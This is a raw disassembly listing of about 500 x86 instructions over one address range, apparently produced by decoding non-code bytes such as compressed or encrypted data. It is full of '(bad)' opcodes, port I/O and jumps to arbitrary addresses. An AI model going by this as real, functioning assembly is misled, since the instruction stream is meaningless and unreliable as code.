  44930c:	add    BYTE PTR es:[esi+esi*4],ch
  449310:	xor    edi,DWORD PTR [esp+esi*4+0xf]
  449314:	cli    
  449315:	xchg   ebp,eax
  449316:	fdiv   DWORD PTR [eax-0x77]
  449319:	xor    DWORD PTR [ecx-0x20986bb8],esi
  44931f:	les    edi,FWORD PTR ds:0xbbbdce03
  449325:	sbb    bh,BYTE PTR [esi]
  449327:	out    0xf1,eax
  449329:	shl    BYTE PTR [ecx-0x65],0x28
  44932d:	stos   DWORD PTR es:[edi],eax
  44932e:	jb     0x44939f
  449330:	sti    
  449331:	dec    edx
  449332:	mov    eax,ds:0x13d78b3
  449337:	aam    0x5d
  449339:	or     al,0x85
  44933b:	xlat   BYTE PTR ds:[ebx]
  44933c:	mov    bl,0x9d
  44933e:	sub    al,0xfd
  449340:	push   ebx
  449341:	jecxz  0x44931f
  449343:	dec    ecx
  449344:	mov    esi,DWORD PTR [ebx+0x35]
  449347:	fcmovnb st,st(1)
  449349:	test   DWORD PTR [ecx],ecx
  44934b:	sbb    al,0xe8
  44934d:	lea    ebx,[eax-0x2c]
  449350:	sti    
  449351:	and    esp,DWORD PTR [ecx]
  449353:	popa   
  449354:	xchg   esp,eax
  449355:	cmp    ebp,DWORD PTR [ebx]
  449357:	jb     0x44934a
  449359:	sbb    ebp,ebx
  44935b:	aad    0x10
  44935d:	stos   BYTE PTR es:[edi],al
  44935e:	fs push edx
  449360:	push   ecx
  449361:	outs   dx,BYTE PTR ds:[esi]
  449362:	sti    
  449363:	rol    edx,0x4b
  449366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449367:	gs leave 
  449369:	adc    al,0x2d
  44936b:	cmp    DWORD PTR [ebx+eax*1-0x71],edx
  44936f:	push   0xa760c8b2
  449374:	pop    ebp
  449375:	adc    edi,ebx
  449377:	pop    ds
  449378:	aaa    
  449379:	mov    eax,0xbcfe5dd5
  44937e:	pop    ds
  44937f:	sar    BYTE PTR ds:0x5c8a7ada,0xce
  449386:	jbe    0x4493e3
  449388:	add    eax,DWORD PTR [edx-0x1ed2b6e]
  44938e:	push   es
  44938f:	or     eax,0xc61005f8
  449394:	ret    0xc80c
  449397:	mov    ch,0x61
  449399:	ret    0x4160
  44939c:	jae    0x44935d
  44939e:	rol    DWORD PTR [ebx-0x4da7a1b2],cl
  4493a4:	inc    edx
  4493a5:	ins    DWORD PTR es:[edi],dx
  4493a6:	pusha  
  4493a7:	aam    0x9
  4493a9:	shl    BYTE PTR [ebx],1
  4493ab:	mov    cl,0xa7
  4493ad:	push   0xf58f2c15
  4493b2:	aas    
  4493b3:	push   ds
  4493b4:	mov    dh,dh
  4493b6:	xor    DWORD PTR [eax+edi*8],0x8d4acac
  4493bd:	or     edx,DWORD PTR [esi+eax*2]
  4493c0:	pop    eax
  4493c1:	mov    ecx,gs
  4493c3:	cwde   
  4493c4:	gs inc esp
  4493c6:	push   ds
  4493c7:	repz dec ebx
  4493c9:	sub    esp,DWORD PTR [edx]
  4493cb:	dec    edx
  4493cc:	in     eax,0x10
  4493ce:	add    eax,ebx
  4493d0:	adc    eax,0xc4df6e02
  4493d5:	ret    0xda74
  4493d8:	bound  ebp,QWORD PTR [ecx+0x7a19ed60]
  4493de:	(bad)  
  4493df:	sub    DWORD PTR [esi],esp
  4493e1:	out    dx,eax
  4493e2:	adc    esp,0xffffffd1
  4493e5:	mov    WORD PTR [ebx-0x5b75c999],ds
  4493eb:	inc    cx
  4493ed:	jecxz  0x449455
  4493ef:	push   ebx
  4493f0:	xchg   esp,eax
  4493f1:	xor    eax,DWORD PTR [edx]
  4493f3:	inc    esp
  4493f4:	popf   
  4493f5:	adc    cl,BYTE PTR [ebp-0x311493a8]
  4493fb:	aad    0x1c
  4493fd:	add    BYTE PTR [ebp-0x5f],dl
  449400:	sti    
  449401:	sub    bl,cl
  449403:	ror    DWORD PTR [ecx+0xd71b099],0x90
  44940a:	mov    ebp,0x4a05e2cf
  44940f:	add    eax,0xfb7e1a8a
  449414:	or     cl,bl
  449416:	pop    ds
  449417:	jge    0x449450
  449419:	sbb    DWORD PTR [edx],ebx
  44941b:	sbb    eax,0xd5bf9008
  449420:	lock jg 0x4493d8
  449423:	mov    al,0xb9
  449425:	xor    edi,DWORD PTR [ecx]
  449427:	xor    al,0x8a
  449429:	leave  
  44942a:	add    DWORD PTR [ebx-0x4e],0x20dfc849
  449431:	(bad)  
  449432:	mov    al,ds:0x97fe2ed5
  449437:	jmp    0x449405
  449439:	call   0x9dcd9b5f
  44943e:	cld    
  44943f:	mov    ah,BYTE PTR [ecx]
  449441:	imul   esi,DWORD PTR [ebp+0x3205faa6],0x76
  449448:	clc    
  449449:	adc    eax,0xe9a18985
  44944e:	pop    esp
  44944f:	mov    edi,0xfb1e3e41
  449454:	adc    cl,BYTE PTR [edi+0x15627cf7]
  44945a:	add    al,0xbd
  44945c:	cli    
  44945d:	loop   0x4494a7
  44945f:	jne    0x4494c8
  449461:	xlat   BYTE PTR ds:[ebx]
  449462:	mov    ch,0x85
  449464:	hlt    
  449465:	adc    eax,0x6aebd5a7
  44946a:	mov    esp,0x3aeafb5
  44946f:	js     0x44942f
  449471:	inc    edi
  449472:	lods   al,BYTE PTR ds:[esi]
  449473:	aad    0x46
  449475:	jge    0x449446
  449477:	fmul   DWORD PTR [edi-0x79]
  44947a:	pusha  
  44947b:	sti    
  44947c:	loope  0x4494e4
  44947e:	dec    ebx
  44947f:	jle    0x4494a5
  449481:	cwde   
  449482:	out    0xd5,al
  449484:	cwde   
  449485:	xchg   edi,eax
  449486:	(bad)  
  449487:	lock popa 
  449489:	(bad)  
  44948a:	jmp    DWORD PTR [ebp-0x4e]
  44948d:	mov    ebx,DWORD PTR [esi+eiz*2]
  449490:	mov    DWORD PTR [esi+0x46],ebx
  449493:	xchg   ebp,eax
  449494:	stos   BYTE PTR es:[edi],al
  449495:	xchg   ecx,eax
  449496:	ss mov ch,0xf9
  449499:	xor    BYTE PTR [edx+0x16],bl
  44949c:	or     BYTE PTR [eax],dl
  44949e:	mov    ch,0x15
  4494a1:	gs push ds
  4494a3:	addr16 sub al,0xa9
  4494a6:	out    0xb,al
  4494a8:	les    esp,FWORD PTR [eax]
  4494aa:	push   ss
  4494ab:	out    dx,al
  4494ac:	pop    esp
  4494ad:	popf   
  4494ae:	xchg   esp,eax
  4494af:	sub    ebp,DWORD PTR [edx-0x29]
  4494b2:	inc    ebx
  4494b3:	out    dx,eax
  4494b4:	call   0x87efdcf2
  4494b9:	stc    
  4494ba:	ret    
  4494bb:	mov    ah,0xea
  4494bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4494be:	or     DWORD PTR [ebp+0x5b],ebp
  4494c1:	int    0x60
  4494c3:	sar    DWORD PTR ds:0xa251459b,1
  4494c9:	(bad)  
  4494ca:	popf   
  4494cb:	aad    0x98
  4494cd:	push   edx
  4494ce:	jle    0x4494dc
  4494d0:	repz dec edx
  4494d2:	aam    0xc9
  4494d4:	scas   al,BYTE PTR es:[edi]
  4494d5:	xchg   ecx,eax
  4494d6:	fimul  WORD PTR [edi-0x77]
  4494d9:	addr16 jmp 0x794888cf
  4494df:	int    0x8e
  4494e1:	dec    ecx
  4494e2:	ins    BYTE PTR es:[edi],dx
  4494e3:	pusha  
  4494e4:	push   ebp
  4494e5:	or     esp,0x7b
  4494e8:	ror    BYTE PTR [edi+0x2389eb13],0x85
  4494ef:	jecxz  0x449552
  4494f1:	xor    al,0xf5
  4494f3:	test   BYTE PTR [esi+0x66747035],0x56
  4494fa:	inc    esp
  4494fb:	xchg   esi,eax
  4494fc:	mov    DWORD PTR [ebp+0x5f20b39],ecx
  449502:	dec    edi
  449503:	xchg   DWORD PTR [edx+0x3],eax
  449506:	loopne 0x449523
  449508:	or     al,0x99
  44950a:	mov    edi,0x92f53c23
  44950f:	sbb    DWORD PTR [ebx],0xf9a2f002
  449515:	pop    edi
  449516:	jl     0x44957e
  449518:	iret   
  449519:	add    dh,BYTE PTR [edx+0x4e]
  44951c:	addr16 inc esi
  44951e:	(bad)  
  44951f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449520:	jne    0x4494d8
  449522:	popa   
  449523:	imul   DWORD PTR [edi]
  449525:	les    eax,FWORD PTR [ebp-0x2e00f1c3]
  44952b:	js     0x449515
  44952d:	xlat   BYTE PTR ds:[ebx]
  44952e:	push   eax
  44952f:	aad    0x63
  449531:	hlt    
  449532:	jp     0x449543
  449534:	loope  0x4494f4
  449536:	push   eax
  449537:	pop    esp
  449538:	mov    bh,dl
  44953a:	inc    ebx
  44953b:	test   al,0xf6
  44953d:	add    BYTE PTR ds:0x44153524,dh
  449543:	ret    0x39fa
  449546:	bound  edx,QWORD PTR [eax+0x2b]
  449549:	jae    0x44952a
  44954b:	mov    edx,0xd91e63fd
  449550:	cmp    eax,0xb874d903
  449555:	fcomi  st,st(5)
  449557:	aad    0xa8
  449559:	xchg   DWORD PTR [ebx+0x7b],ecx
  44955c:	lahf   
  44955d:	dec    edi
  44955e:	dec    esi
  44955f:	retf   0x7788
  449562:	mov    edx,0xac3ffcc5
  449567:	jmp    0x7742988e
  44956c:	loope  0x44951f
  44956e:	into   
  44956f:	cdq    
  449570:	mov    al,ds:0x7ae760fd
  449575:	shr    esp,0x1d
  449578:	mov    al,0x1c
  44957a:	das    
  44957b:	aam    0x26
  44957d:	leave  
  44957e:	clc    
  44957f:	pop    esi
  449580:	or     esi,DWORD PTR [edx-0x6c74de9d]
  449586:	dec    ebx
  449587:	dec    ebp
  449588:	inc    ecx
  449589:	clc    
  44958a:	xchg   edi,eax
  44958b:	mov    ds:0xd72d0d10,al
  449590:	add    ecx,eax
  449592:	(bad)  
  449593:	(bad)  
  449594:	adc    eax,DWORD PTR ds:0xd988ac9c
  44959a:	in     al,0x6
  44959c:	cmp    eax,0x7c40b183
  4495a1:	add    ebp,esp
  4495a3:	cmp    eax,0x4da1e705
  4495a8:	addr16 loop 0x44960d
  4495ab:	adc    eax,DWORD PTR [ebx]
  4495ad:	mov    ds:0xe9568e60,al
  4495b2:	out    dx,eax
  4495b3:	xor    BYTE PTR [edi+0x455ce532],cl
  4495b9:	inc    eax
  4495ba:	pop    ds
  4495bb:	rol    DWORD PTR [edi-0x3826ef85],0x25
  4495c2:	push   ds
  4495c3:	outs   dx,DWORD PTR ds:[esi]
  4495c4:	std    
  4495c5:	jg     0x4495b8
  4495c7:	repnz dec BYTE PTR [eax]
  4495ca:	push   ss
  4495cb:	rcl    BYTE PTR [ebp-0x4b],cl
  4495ce:	pop    esi
  4495cf:	cli    
  4495d0:	lds    esi,FWORD PTR [ecx-0x34b7e700]
  4495d6:	jl     0x449647
  4495d8:	pop    edi
  4495d9:	push   ds
  4495da:	push   ds
  4495db:	adc    ch,ah
  4495dd:	sbb    eax,0x453f5587
  4495e2:	aas    
  4495e3:	retf   
  4495e4:	push   ecx
  4495e5:	sub    al,0xc4
  4495e7:	push   edx
  4495e8:	mov    eax,ds:0x84801f92
  4495ed:	es ins DWORD PTR es:[edi],dx
  4495ef:	int    0x89
  4495f1:	add    eax,edx
  4495f3:	mov    eax,DWORD PTR [esi]
  4495f5:	inc    edx
  4495f6:	adc    DWORD PTR [eax-0xaa3e6da],ecx
  4495fc:	test   al,0xa0
  4495fe:	and    eax,0x68417c54
  449603:	mov    dl,0x6d
  449605:	add    BYTE PTR [edi],bl
  449607:	repz xchg esp,eax
  449609:	sbb    BYTE PTR [eax+edi*1],bl
  44960c:	inc    esp
  44960d:	dec    ecx
  44960e:	cmp    al,0xb5
  449610:	mov    edx,0x48750b5b
  449615:	jbe    0x449662
  449617:	stc    
  449618:	xchg   edi,eax
  449619:	fstp   TBYTE PTR [ebp+eax*1-0x56]
  44961d:	xchg   esp,eax
  44961e:	mov    bh,0x9e
  449620:	mov    ch,al
  449622:	pop    esi
  449623:	in     eax,0x8
  449625:	sbb    ebp,DWORD PTR [edx]
  449627:	aam    0xa3
  449629:	or     DWORD PTR [eax-0x662232c8],edx
  44962f:	fisttp DWORD PTR [esi+0x5e7c0517]
  449635:	push   0xfffffff8
  449637:	les    esi,FWORD PTR [esi+edi*4-0x67b775bc]
  44963e:	push   edi
  44963f:	aad    0xc0
  449641:	aam    0xe4
  449643:	mov    DWORD PTR [ecx+ecx*1+0x3be8f975],ebx
  44964a:	cli    
  44964b:	fnstcw WORD PTR [edx-0x765939ec]
  449651:	xor    bl,0xc7
  449654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449655:	aam    0x65
  449657:	mov    bl,0xd0
  449659:	repz mov ah,0x0
  44965c:	jmp    0x18e:0x270b5e85
  449663:	pop    esi
  449664:	mov    BYTE PTR [ebx],bl
  449666:	mov    al,BYTE PTR [edi]
  449668:	rol    DWORD PTR [ebp-0xa],cl
  44966b:	or     BYTE PTR [eax-0x1f83c039],cl
  449671:	and    DWORD PTR [esi+0x235652f],0xe402bfe8
  44967b:	jb     0x44963f
  44967d:	popa   
  44967e:	sbb    edi,DWORD PTR [edx]
  449680:	je     0x4496f4
  449682:	add    ebp,DWORD PTR [edx-0x5f464675]
  449688:	arpl   WORD PTR [ebp+0x63],di
  44968b:	call   DWORD PTR [eax-0x37]
  44968e:	push   edi
  44968f:	aam    0x38
  449691:	dec    ebp
  449692:	ja     0x4496e7
  449694:	xchg   edi,eax
  449695:	push   esp
  449696:	arpl   WORD PTR [ebx+ecx*4],ax
  449699:	std    
  44969a:	jg     0x4496d3
  44969c:	ins    DWORD PTR es:[edi],dx
  44969d:	and    al,0xc6
  44969f:	repz pusha 
  4496a1:	adc    eax,DWORD PTR [esi-0x21013056]
  4496a7:	mov    BYTE PTR gs:[edx-0x7f],al
  4496ab:	and    BYTE PTR [edi-0x29],cl
  4496ae:	push   0xe1dbe6a7
  4496b3:	push   ebx
  4496b4:	mov    DWORD PTR [edx+0x4],ebx
  4496b7:	leave  
  4496b8:	mov    ebp,0xeb351a03
  4496bd:	jbe    0x449737
  4496bf:	cld    
  4496c0:	retf   
  4496c1:	stos   BYTE PTR es:[edi],al
  4496c2:	or     BYTE PTR [ebp-0x7784b278],0xd6
  4496c9:	dec    ebx
  4496ca:	add    DWORD PTR [esi+ebx*2],edi
  4496cd:	add    esp,DWORD PTR [esi+0x78576587]
  4496d3:	leave  
  4496d4:	shl    BYTE PTR [edx],1
  4496d6:	out    dx,al
  4496d7:	icebp  
  4496d8:	inc    edx
  4496d9:	add    ecx,DWORD PTR [edx+ebx*8-0x4f6da354]
  4496e0:	jmp    0x4496e2
  4496e2:	pushf  
  4496e3:	ja     0x4496fa
  4496e5:	popf   
  4496e6:	mov    eax,ds:0x36b36e48
  4496eb:	pop    edx
  4496ec:	sti    
  4496ed:	inc    edi
  4496ee:	jge    0x4496c4
  4496f0:	fdiv   DWORD PTR [edi+0x2b]
  4496f3:	out    dx,al
  4496f4:	inc    esi
  4496f5:	mov    ds:0xcbcad4ed,eax
  4496fa:	push   eax
  4496fb:	data16 jae 0x4496a7
  4496fe:	jo     0x449704
  449700:	dec    edx
  449701:	arpl   bx,bp
  449703:	lods   eax,DWORD PTR ds:[esi]
  449704:	call   0x9876:0x90d5b14d
  44970b:	out    0x5,al
  44970d:	cwde   
  44970e:	cmp    DWORD PTR [ecx-0x78],edi
  449711:	and    DWORD PTR [ecx],0x26370d2e
  449717:	pushf  
  449718:	clc    
  449719:	hlt    
  44971a:	gs aam 0x3b
  44971d:	(bad)  
  44971e:	add    BYTE PTR [esi-0x4],ah
  449721:	call   0x67da7ea9
  449726:	imul   DWORD PTR [ebp-0x31353a33]
  44972c:	int3   
  44972d:	int3   
  44972e:	cmc    
  44972f:	aam    0xd4
  449731:	or     BYTE PTR [ecx+0x4c06ed37],dl
  449737:	cmp    bh,dh
  449739:	mov    ch,0xa7
  44973b:	ror    DWORD PTR [eax],1
  44973d:	inc    ebx
  44973e:	stos   DWORD PTR es:[edi],eax
  44973f:	mov    eax,ds:0xa4d39d29
  449744:	and    bl,BYTE PTR [edi-0x44]
  449747:	aad    0x74
  449749:	xchg   esi,eax
  44974a:	lods   al,BYTE PTR ds:[esi]
  44974b:	dec    edx
  44974c:	push   es
  44974d:	jae    0x44978d
  44974f:	jnp    0x4496da
  449751:	ins    DWORD PTR es:[edi],dx
  449752:	aam    0x28
  449754:	dec    ebp
  449755:	mov    ch,0xf2
  449757:	sahf   
  449758:	jno    0x44975a
  44975a:	cmp    BYTE PTR [ebp+0x42],dl
  44975d:	push   ss
  44975e:	jl     0x4497aa
  449760:	add    eax,0x3ae85fed
  449765:	es scas al,BYTE PTR es:[edi]
  449767:	jo     0x44978c
  449769:	xchg   BYTE PTR [edi],bl
  44976b:	fwait
  44976c:	rol    BYTE PTR [ecx],1
  44976e:	test   eax,0x9198a92
  449773:	into   
  449774:	mov    ebp,?
  449776:	dec    eax
  449777:	xor    DWORD PTR [eax-0x58],ecx
  44977a:	fisttp QWORD PTR [ebp+0x6e357f1c]
  449780:	mov    DWORD PTR [edi-0x68],esp
  449783:	push   ds
  449784:	fsubr  QWORD PTR [esi+eiz*4+0x65]
  449788:	xchg   BYTE PTR ds:0x75c59e1d,al
  44978e:	jle    0x4497ec
  449790:	inc    esp
  449791:	fld    DWORD PTR [edi-0x3ee32c47]
  449797:	push   ebp
  449798:	(bad)  [edx]
  44979a:	push   ds
  44979b:	cdq    
  44979c:	xchg   esp,eax
  44979d:	xchg   ebp,eax
  44979e:	push   edx
  44979f:	xchg   ecx,eax
  4497a0:	mov    DWORD PTR [ebx-0x26],ebx
  4497a3:	add    DWORD PTR [esi+0x4b],edi
  4497a6:	sub    esi,esi
  4497a8:	mov    WORD PTR [edx],es
  4497aa:	data16 mov bh,0x66
  4497ad:	or     BYTE PTR [edi],dl
  4497af:	imul   ebp,ecx,0x989b6478
  4497b5:	aad    0x93
  4497b7:	push   ss
  4497b8:	stos   DWORD PTR es:[edi],eax
  4497b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4497ba:	and    BYTE PTR [edi+ebx*4],bl
  4497bd:	fsubr  st,st(0)
  4497bf:	inc    esp
  4497c0:	xlat   BYTE PTR ds:[ebx]
  4497c1:	add    BYTE PTR [esi-0x6a],0x8f
  4497c5:	add    ah,dh
  4497c7:	pop    ebx
  4497c8:	sahf   
  4497c9:	mov    bl,0xc8
  4497cb:	dec    BYTE PTR [ebx-0x4463b53]
  4497d1:	popf   
  4497d2:	call   0x83d4:0x89c7087c
  4497d9:	fnstcw WORD PTR [esi+0x6b]
  4497dc:	push   eax
  4497de:	push   ss
  4497df:	sub    cl,BYTE PTR [eax-0x6f77375d]
  4497e5:	sbb    ecx,ecx
  4497e7:	pop    esp
  4497e8:	and    eax,0xb14d4c03
  4497ed:	inc    ebx
  4497ee:	mov    esi,edx
  4497f0:	sub    BYTE PTR [ebx+0x1b],bl
  4497f3:	pusha  
  4497f4:	pusha  
  4497f5:	mov    BYTE PTR [eax-0x39],ah
  4497f8:	or     al,0xe3
  4497fa:	aad    0xdd
  4497fc:	push   0xffffffef
  4497fe:	dec    edx
  4497ff:	aad    0xdf
  449801:	push   0x5a
  449803:	dec    ebx
  449804:	cs jle 0x44986c
  449807:	xor    eax,0x14694bd5
  44980c:	mov    BYTE PTR [ebp+0x71],dh
  44980f:	test   al,0xcf
  449811:	dec    edi
  449812:	add    dh,bl
  449814:	cmp    al,0x1c
  449816:	sub    al,0x8e
  449818:	dec    edi
  449819:	into   
  44981a:	clc    
  44981b:	fisub  WORD PTR [ebx+0x3]
  44981e:	mov    bh,0x5f
  449820:	or     al,0x4f
  449822:	push   ds
  449823:	stc    
  449824:	imul   edx,DWORD PTR [edi+0x33],0xffffffb6
  449828:	and    bh,0xf3
  44982b:	aad    0x28
  44982d:	sbb    BYTE PTR [ebp-0x687fc2a6],dl
  449833:	mov    ecx,DWORD PTR [ecx-0xc965967]
  449839:	shl    cl,1
  44983b:	dec    esi
  44983c:	je     0x4497cd
  44983e:	sbb    esi,0xb80342d0
  449844:	xchg   ebx,eax
  449845:	cmp    edi,ebx
  449847:	inc    ebx
  449848:	sub    eax,0x81e703dd
  44984d:	mov    ebp,0xc2a1461c
  449852:	lahf   
  449853:	and    al,0x18
  449855:	sar    DWORD PTR [esi-0x2c],0x5d
  449859:	je     0x449823
  44985b:	test   al,0x53
  44985d:	pop    ebx
  44985e:	in     al,0x89
  449860:	mov    BYTE PTR [ecx+0x3fe5bf43],al
  449866:	add    eax,0xa60277aa
  44986b:	push   0x5
  44986d:	or     eax,0x6c516cba
  449872:	ins    BYTE PTR es:[edi],dx
  449873:	fisttp WORD PTR [ebx+0x68e55af0]
  449879:	push   ebx
  44987a:	arpl   WORD PTR [esi+0x6ae617a9],si
  449880:	adc    dl,dh
  449882:	imul   edx,DWORD PTR [ebp-0x2ea0a2c],0xfffffffd
  449889:	dec    ebx
  44988a:	push   eax
  44988b:	aad    0x24
  44988d:	mov    dl,0x19
  44988f:	repz xor al,0xc3
  449892:	mov    al,0xd1
  449894:	sbb    al,dl
  449896:	xlat   BYTE PTR ds:[ebx]
  449897:	push   ds
  449898:	push   es
  449899:	arpl   di,bx
  44989b:	into   
  44989c:	pop    ds
  44989d:	mov    BYTE PTR [eax-0x5b],ah
  4498a0:	pop    ebp
  4498a1:	fs and al,0xbb
  4498a4:	inc    edx
  4498a5:	or     ah,BYTE PTR [edx]
  4498a7:	(bad)  
  4498a8:	push   0x61
  4498aa:	dec    edi
  4498ab:	sbb    BYTE PTR [edi],bh
  4498ad:	pop    edx
  4498ae:	ret    
  4498af:	loope  0x449919
  4498b1:	sbb    eax,0x4583d54e
  4498b6:	aaa    
  4498b7:	pop    es
  4498b8:	mov    edx,0x96037a0f
  4498bd:	ret    
  4498be:	std    
  4498bf:	in     al,dx
  4498c0:	mov    ah,0x57
  4498c2:	call   0xdeb744c0
  4498c7:	daa    
  4498c8:	or     BYTE PTR [ebp-0x68372bce],cl
  4498ce:	jecxz  0x44989b
  4498d0:	lock or eax,0xd7f73f93
  4498d6:	stos   DWORD PTR es:[edi],eax
  4498d7:	aam    0xf0
  4498d9:	or     bh,bl
  4498db:	jbe    0x44985f
  4498dd:	push   0x7e17d452
  4498e2:	pop    edi
  4498e3:	or     eax,0xb889a74e
  4498e8:	mov    BYTE PTR [edi],dh
  4498ea:	clc    
  4498eb:	jns    0x449923
  4498ed:	int3   
  4498ee:	adc    BYTE PTR [edi-0x2b],0xb
  4498f2:	mov    ds:0x1f5b155f,eax
  4498f7:	sub    eax,0xfcd18882
  4498fc:	sub    DWORD PTR [edi+ebx*1],ebx
  4498ff:	jnp    0x449971
  449901:	pusha  
  449902:	jmp    0x8ad4:0x6cfc24b7
  449909:	push   ebp
  44990a:	push   0xa883ba23
  44990f:	lahf   
  449910:	mov    ch,ch
  449912:	(bad)  
  449913:	lods   eax,DWORD PTR ds:[esi]
  449914:	sub    edx,edi
  449916:	mov    ah,0xfe
  449918:	repnz add BYTE PTR [esi],dl
  44991b:	xor    bl,BYTE PTR [edx+0x2b50d187]
  449921:	mov    dl,0x38
  449923:	dec    edx
  449924:	mov    bh,dl
  449926:	int3   
  449927:	(bad)  
  449928:	push   es
  449929:	xchg   ebx,eax
  44992a:	jl     0x4498e3
  44992c:	pop    ebx
  44992d:	div    DWORD PTR [esp+eax*4]
  449930:	or     BYTE PTR [ebx+0x2d],al
  449933:	sbb    al,0x59
  449935:	sbb    eax,0x4c9bc752
  44993a:	or     DWORD PTR [esi],ecx
  44993c:	stc    
  44993d:	push   edx
  44993e:	cmp    bh,al
  449940:	mov    ecx,0x25911fee
  449945:	stos   BYTE PTR es:[edi],al
  449946:	scas   al,BYTE PTR es:[edi]
  449947:	cmp    ax,0x2942
  44994b:	retf   0x24e2
  44994e:	push   edx
  44994f:	ror    BYTE PTR [edx-0x65],cl
  449952:	pop    ds
  449953:	push   eax
  449954:	and    eax,DWORD PTR [edx]
  449956:	pop    es
  449957:	sbb    ecx,DWORD PTR [ecx-0x619460c3]
  44995d:	xchg   ebx,eax
  44995e:	lods   eax,DWORD PTR ds:[esi]
  44995f:	cmp    BYTE PTR [edx],0x2
  449962:	push   0x92252601
  449967:	(bad)  
  449968:	or     DWORD PTR [ecx-0x1747dae1],eax
  44996e:	inc    edx
  44996f:	sub    al,0xa2
  449971:	inc    esp
  449972:	mov    ch,dl
  449974:	dec    edx
  449975:	in     al,0xa
  449977:	mov    esp,0x83b5e3cf
  44997c:	mov    BYTE PTR [ebx],al
  44997e:	aam    0x85
  449980:	scas   eax,DWORD PTR es:[edi]
  449981:	cli    
  449982:	mov    ?,WORD PTR [ecx]
  449984:	clc    
  449985:	mov    ch,BYTE PTR [ebx]
  449987:	push   esp
  449988:	mov    BYTE PTR ds:0x52742a0f,cl
  44998e:	push   esp
  44998f:	mov    esi,0x1176b272
  449994:	imul   edi,DWORD PTR [esi-0x47132ba3],0xffffffe5
  44999b:	jae    0x4499a7
  44999d:	add    ch,BYTE PTR [edx]
  44999f:	test   DWORD PTR [edi],0x2c8507aa
  4499a5:	loope  0x449a0a
  4499a7:	in     eax,0x34
  4499a9:	sbb    eax,0xc015fb0b
  4499ae:	pop    esp
  4499af:	sti    
  4499b0:	xor    BYTE PTR [ebp-0x3fff28ef],ah
  4499b6:	push   ebp
  4499b7:	pop    ebx
  4499b8:	xor    ch,dh
  4499ba:	xchg   ecx,eax
  4499bb:	xchg   edi,eax
  4499bc:	mov    bh,bl
  4499be:	lahf   
  4499bf:	pop    ss
  4499c0:	icebp  
  4499c1:	dec    eax
  4499c2:	(bad)  
  4499c3:	aad    0x6b
  4499c5:	mov    edi,0xe25efacf
  4499ca:	add    edx,edi
  4499cc:	jle    0x449986
  4499ce:	sub    eax,0x722bdde7
  4499d3:	mov    DWORD PTR gs:[ebp-0x74e57270],esp
  4499da:	add    ecx,esp
  4499dc:	or     eax,DWORD PTR [edx]
  4499de:	pop    edx
  4499df:	pop    edi
  4499e0:	sbb    al,0x47
  4499e2:	jg     0x449966
  4499e4:	out    0xab,al
  4499e6:	pusha  
  4499e7:	sbb    DWORD PTR [ecx],esi
  4499e9:	xchg   ebp,eax
  4499ea:	mov    ebx,0x7ae0089e
  4499ef:	(bad)  
  4499f0:	outs   dx,BYTE PTR ds:[esi]
  4499f1:	adc    ebx,DWORD PTR [ebp+ecx*1-0x20]
  4499f5:	enter  0xc5c6,0x1b
  4499f9:	push   edi
  4499fa:	pop    ds
  4499fb:	rcr    DWORD PTR [edi+0x2ea23c7],1
  449a01:	sub    esp,DWORD PTR [esi-0x2d]
  449a04:	jecxz  0x449995
  449a06:	lods   al,BYTE PTR ds:[esi]
  449a07:	or     eax,0xded0a2c7
  449a0c:	mov    ch,0x62
  449a0e:	push   ds
  449a0f:	mov    DWORD PTR [edi+0x21],edi
  449a12:	add    DWORD PTR [esi],esi
  449a14:	pop    esp
  449a15:	adc    ah,ah
  449a17:	adc    al,0xb4
  449a19:	add    eax,0xc8dfcdea
  449a1e:	cdq    
  449a1f:	mov    edi,0xfb1fdb51
  449a24:	inc    edx
  449a25:	in     al,dx
  449a26:	ja     0x449a41
  449a28:	imul   ecx,DWORD PTR [edi+0x5eed50b],0xffffff9c
  449a2f:	icebp  
  449a30:	sti    
  449a31:	into   
  449a32:	inc    eax
  449a33:	fcmovnbe st,st(7)
  449a35:	xor    BYTE PTR [esi],bl
  449a37:	xchg   ebp,eax
  449a38:	aam    0x4f
  449a3a:	popa   
  449a3b:	jle    0x449a23
  449a3d:	aad    0xba
  449a3f:	aad    0xd7
  449a41:	dec    ecx
  449a42:	mov    cl,0x23
  449a44:	daa    
  449a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449a46:	dec    ecx
  449a47:	out    0x88,al
  449a49:	inc    ecx
  449a4a:	ins    DWORD PTR es:[edi],dx
  449a4b:	gs fs add al,0x48
  449a4f:	or     BYTE PTR [esi+0x0],dh
  449a52:	(bad)  
  449a53:	sub    eax,0x4bbda1c4
  449a58:	jmp    DWORD PTR [ebp-0x5a]
  449a5b:	scas   eax,DWORD PTR es:[edi]
  449a5c:	data16 fsub DWORD PTR [eax-0x57]
  449a60:	(bad)  
  449a61:	cs call 0x8464faef
  449a67:	aam    0xea
  449a69:	or     eax,0x8dac0c2d
  449a6e:	repz imul BYTE PTR [edi-0x761d2903]
  449a75:	ror    ebp,1
  449a77:	sti    
  449a78:	inc    esp
  449a79:	xchg   ah,cl
  449a7b:	aam    0xf
  449a7d:	retf   0xe7e2
  449a80:	xor    eax,0x94c806dc
  449a85:	scas   eax,DWORD PTR es:[edi]
  449a86:	(bad)  
  449a87:	adc    DWORD PTR [ecx],eax
  449a89:	inc    ebx
  449a8a:	iret   
  449a8b:	cld    
  449a8c:	sahf   
  449a8d:	popa   
  449a8e:	add    al,dh
  449a90:	retf   
  449a91:	inc    esp
  449a92:	sbb    dh,bl
  449a94:	lods   al,BYTE PTR ds:[esi]
  449a95:	add    eax,0x33db9f78
  449a9a:	fisttp WORD PTR [edi]
  449a9c:	mov    bl,cl
  449a9e:	cld    
  449a9f:	jge    0x449a88
  449aa1:	mov    al,0x1b
  449aa3:	loop   0x449afa
  449aa5:	add    edx,edx
  449aa7:	xchg   esp,eax
  449aa8:	push   ds
  449aa9:	outs   dx,DWORD PTR ds:[esi]
  449aaa:	dec    ebp
  449aab:	jle    0x449aa5
  449aad:	loop   0x449a31
  449aaf:	push   edx
  449ab0:	or     ebx,0xdce95f54
  449ab6:	pusha  
  449ab7:	clc    
  449ab8:	xor    DWORD PTR [eax],edi
  449aba:	test   eax,0x79b55e78
  449abf:	aad    0xce
  449ac1:	xchg   esp,eax
  449ac2:	jo     0x449b2b
  449ac4:	sbb    eax,DWORD PTR [ecx-0x5011bc9b]
